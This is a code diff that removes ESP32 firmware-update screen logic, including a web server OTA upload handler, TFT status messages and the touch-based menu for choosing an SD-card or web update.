-    drawTabBar("", false, "", false, "Back", false);
-    fwRestoreNavChrome();
-    int x, y;
-    if (waitForTouchXY(x, y)) {
-      WiFi.disconnect();
-      drawMenu();
-      return;
-    }
-    performWebOTAUpdate();
-    return;
-  }
-  tft.setTextColor(TFT_GREEN, TFT_BLACK);
-  tft.setCursor(10, 110 + yshift);
-  tft.println("mDNS OK");
-  tft.setTextColor(TFT_WHITE, TFT_BLACK);
-  tft.setCursor(10, 120 + yshift);
-  tft.println("Web server ready!");
-  tft.setCursor(10, 130 + yshift);
-  tft.println("Access via browser");
-
-  server.on("/", HTTP_GET, []() {
-    server.sendHeader("Connection", "close");
-    server.send(200, "text/html", loginIndex);
-  });
-  server.on("/serverIndex", HTTP_GET, []() {
-    server.sendHeader("Connection", "close");
-    server.send(200, "text/html", serverIndex);
-  });
-  server.on("/update", HTTP_POST, []() {
-    server.sendHeader("Connection", "close");
-    bool success = !Update.hasError();
-    server.send(200, "text/plain", success ? "OK" : "FAIL");
-    if (success) {
-      tft.fillRect(0, 37, 240, 320, TFT_BLACK);
-      tft.setCursor(10, 10 + yshift);
-      tft.setTextColor(TFT_GREEN, TFT_BLACK);
-      tft.setTextSize(1);
-      tft.println("Update OK!");
-      tft.setTextColor(TFT_WHITE, TFT_BLACK);
-      tft.setCursor(10, 20 + yshift);
-      tft.println("Rebooting...");
-      delay(2000);
-      ESP.restart();
-    } else {
-      tft.fillRect(0, 37, 240, 320, TFT_BLACK);
-      tft.setCursor(10, 10 + yshift);
-      tft.setTextColor(UI_WARN, TFT_BLACK);
-      tft.println("X Update Failed!");
-      tft.setTextColor(TFT_WHITE, TFT_BLACK);
-      tft.setCursor(10, 20 + yshift);
-      tft.println("Touch to retry or Back");
-      drawTabBar("", false, "", false, "Back", false);
-      fwRestoreNavChrome();
-      int x, y;
-      if (waitForTouchXY(x, y)) {
-        server.close();
-        WiFi.disconnect();
-        drawMenu();
-        return;
-      }
-      performWebOTAUpdate();
-    }
-  }, [&inUpdate, &totalUploaded]() {
-    HTTPUpload& upload = server.upload();
-    if (upload.status == UPLOAD_FILE_START) {
-      tft.fillRect(0, 37, 240, 320, TFT_BLACK);
-      tft.setCursor(10, 10 + yshift);
-      tft.setTextColor(TFT_WHITE, TFT_BLACK);
-      tft.setTextSize(1);
-      tft.println("Web OTA Started...");
-      drawTabBar("", false, "", false, "Back", true);
-      totalUploaded = 0;
-      inUpdate = true;
-      if (!Update.begin(UPDATE_SIZE_UNKNOWN)) {
-        Update.printError(Serial);
-      }
-    } else if (upload.status == UPLOAD_FILE_WRITE) {
-      if (Update.write(upload.buf, upload.currentSize) != upload.currentSize) {
-        Update.printError(Serial);
-      }
-      totalUploaded += upload.currentSize;
-      int percent = (totalUploaded * 100) / (upload.totalSize ? upload.totalSize : 1000000);
-      tft.fillRect(10, 30 + yshift, 220, 10, TFT_BLACK);
-      tft.setCursor(10, 30 + yshift);
-      tft.setTextColor(TFT_WHITE, TFT_BLACK);
-      tft.printf("Progress: %d%%", percent);
-    } else if (upload.status == UPLOAD_FILE_END) {
-      if (Update.end(true)) {
-        Serial.printf("Update Success: %u\n", upload.totalSize);
-      } else {
-        Update.printError(Serial);
-      }
-      totalUploaded = 0;
-      inUpdate = false;
-    }
-  });
-
-  server.begin();
-  fwEnsureToolbar();
-
-  uint32_t lastInputMs = 0;
-  while (true) {
-    server.handleClient();
-    const uint32_t now = millis();
-    if ((uint32_t)(now - lastInputMs) >= 50u) {
-      lastInputMs = now;
-      if (featureHasTouchNavBar()) {
-        maintainTouchNavBar();
-      }
-      if (feature_exit_requested) {
-        server.close();
-        WiFi.disconnect();
-        return;
-      }
-      if (!inUpdate) {
-        if (fwActionPressed("Back")) {
-          server.close();
-          WiFi.disconnect();
-          drawMenu();
-          return;
-        }
-        int x, y;
-        if (readTouchXY(x, y) && fwActionPressed("Back", x, y, true)) {
-          server.close();
-          WiFi.disconnect();
-          drawMenu();
-          return;
-        }
-      }
-    }
-    delay(1);
-  }
-}
-
-void updateSetup() {
-
-  fwResetNavCache();
-  tft.fillScreen(TFT_BLACK);
-  tft.drawFastHLine(0, 19, 240, UI_LINE);
-
-  tft.setTextColor(TFT_WHITE, TFT_BLACK);
-  tft.setTextSize(0);
-
-  setupTouchscreen();
-
-  uiDrawn = false;
-
-  float currentBatteryVoltage = readBatteryVoltage();
-  drawStatusBar(currentBatteryVoltage, true);
-  runUI();
-
-  drawMenu();
-}
-
-void updateLoop() {
-
-  if (featureHasTouchNavBar()) {
-    maintainTouchNavBar();
-    if (isTouchNavButtonPressedEdge(BTN_LEFT)) {
-      feature_exit_requested = true;
-      return;
-    }
-  } else if (feature_active && isButtonPressed(BTN_SELECT)) {
-    feature_exit_requested = true;
-    return;
-  }
-
-  updateStatusBar();
-  runUI();
-  if (feature_exit_requested) return;
-
-  if (fwActionPressed("Back")) {
-    feature_exit_requested = true;
-    delay(200);
-    return;
-  }
-
-  int x, y;
-  if (readTouchXY(x, y)) {
-    if (fwActionPressed("Back", x, y, true)) {
-      feature_exit_requested = true;
-      delay(200);
-      return;
-    }
-    if (checkButton(x, y, BUTTON1_X, BUTTON1_Y, BUTTON_WIDTH, BUTTON_HEIGHT)) {
-      performSDUpdate();
-    }
-    else if (checkButton(x, y, BUTTON2_X, BUTTON2_Y, BUTTON_WIDTH, BUTTON_HEIGHT)) {
-      performWebOTAUpdate();
-    }
-    delay(200);
-  }
-}
-}
